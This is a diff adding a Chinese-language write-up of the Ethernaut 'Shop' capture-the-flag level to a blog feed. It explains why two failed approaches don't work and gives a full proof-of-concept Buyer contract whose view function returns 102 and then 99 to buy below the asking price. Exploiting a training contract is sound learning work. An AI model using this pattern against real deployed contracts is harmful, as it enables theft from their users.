@@ -721,8 +721,60 @@
 <ul>
 <li>assert()失败耗费所有gas</li>
 </ul>
-<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>​    404 Not found ╮(╯▽╰)╭我也想做，可是它是404啊！</p>
-<p>​    做(chao)了好久好久好久，终于搞定了<del>~</del></p>
+<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><blockquote>
+<p>​    404 Not found ╮(╯▽╰)╭我也想做，可是它是404啊！</p>
+</blockquote>
+<p>11.22 更新！Ethernaut终于更新了！全（chuan）新版本——0.5.0现已上线。</p>
+<p>通过条件：</p>
+<ul>
+<li>最终价格低于叫价 </li>
+</ul>
+<p>​    简单分析一波：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;//初始价格</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">    //要满足这个条件，买家给出的价格要大于等于100，并且货物没有卖出</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price.gas(3000)();</span><br><span class="line">    //将买家出的价格作为出售价格</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    问题很简单，只要使price() 两次返回不同的值即可，有很多方法可以办到，那么问题来了：应该根据什么判断应该返回哪个值呢。最开始我想的是设一个bool变量，在第一次被调用后修改该变量的值，第二次便可以返回不同的值：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//就像这样</span><br><span class="line">	bool public flag = false;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint)&#123;</span><br><span class="line">        if (flag == true)&#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">        return 102;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    然而，编译都通不过！因为view这个修饰符的限定，我们不能修改状态，修改状态在官方文档中如是介绍：</p>
+<blockquote>
+<h5 id="View-函数"><a href="#View-函数" class="headerlink" title="View 函数"></a>View 函数</h5><p>可以将函数声明为 <code>view</code> 类型，这种情况下要保证不修改状态。</p>
+<p>下面的语句被认为是修改状态：</p>
+<ol>
+<li>修改状态变量。</li>
+<li><a href="file:///C:/Users/xzy/Desktop/Work/solidity-中文文档/index.html#events" target="_blank" rel="noopener">产生事件</a>。</li>
+<li>创建其它合约</li>
+<li>使用 <code>selfdestruct</code>。</li>
+<li>通过调用发送以太币。</li>
+<li>调用任何没有标记为 <code>view</code> 或者 <code>pure</code> 的函数。</li>
+<li>使用低级调用。</li>
+<li>使用包含特定操作码的内联汇编。</li>
+</ol>
+</blockquote>
+<p>​    所以我们得另寻他法，回到题目合约中，我们可以发现在第一次调用price() 的前后，布尔型变量isSold的值发生了改变，那么我们是不是可以通过它来作为判断条件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function price() external view returns (uint)&#123;</span><br><span class="line">    if (target.isSold() == true)&#123;</span><br><span class="line">        return 99;</span><br><span class="line">    &#125;</span><br><span class="line">    return 102;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    然而，编译是通过了，在调用函数的时候，Remix提示如下：</p>
+<blockquote>
+<h6 id="Gas-estimation-failed"><a href="#Gas-estimation-failed" class="headerlink" title="Gas estimation failed"></a>Gas estimation failed</h6><p>Gas estimation errored with the following message (see below). The transaction execution will likely fail. Do you want to force sending?<br>gas required exceeds allowance (8000029) or always failing transaction</p>
+</blockquote>
+<p>​    这段话大概的意思就是无法估计gas的消耗，搜索一通后还是没有解决这个问题。</p>
+<p>​    后来在他人的帮助下才知道，不能使用变量作为判断条件，因为在执行判断之前还要去storage中访问target变量的值，这会消耗大量的gas，导致后面无法正常运行，从而失败。</p>
+<p><img src="/2019/11/09/Ethernaut%20WriteUp/img9.png" alt></p>
+<p>​    通过etherscan上的追踪，我们可以看到，失败的原因就是这里，访问storage需要消耗800gas，而此时没有那么多gas了。</p>
+<p>​    将target改为Shop(msg.sender) 就没有问题了，在if语句外面，我们已经使用了msg.sender，就不需要再次去访问storage，从而减少了gas的消耗。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    function price() external view returns (uint)&#123;</span><br><span class="line">        if (Shop(msg.sender).isSold() == true)&#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">        return 102;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    完整Poc：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price.gas(3000)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer&#123;</span><br><span class="line">    </span><br><span class="line">    Shop target;</span><br><span class="line">    </span><br><span class="line">    function attack(address _addr) public&#123;</span><br><span class="line">        target = Shop(_addr);</span><br><span class="line">        target.buy();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function price() external view returns (uint)&#123;</span><br><span class="line">        if (Shop(msg.sender).isSold() == true)&#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">        return 102;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    price中的if语句还可以使用更加简单的方式写：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return Shop(msg.sender).isSold()?99:102;</span><br></pre></td></tr></table></figure>
+
+<p>关键：</p>
+<ul>
+<li>gas消耗的把握，访问storage会消耗大量的gas，如果gas有限，尽量避免访问storage</li>
+</ul>
+<p>做(chao)了好久好久好久，终于搞定了<del>~</del></p>
 <p>​    完结撒花<em>★,°</em>:.☆(￣▽￣)/$:<em>.°★</em> 。</p>
 <p>​    </p>
 ]]></content>
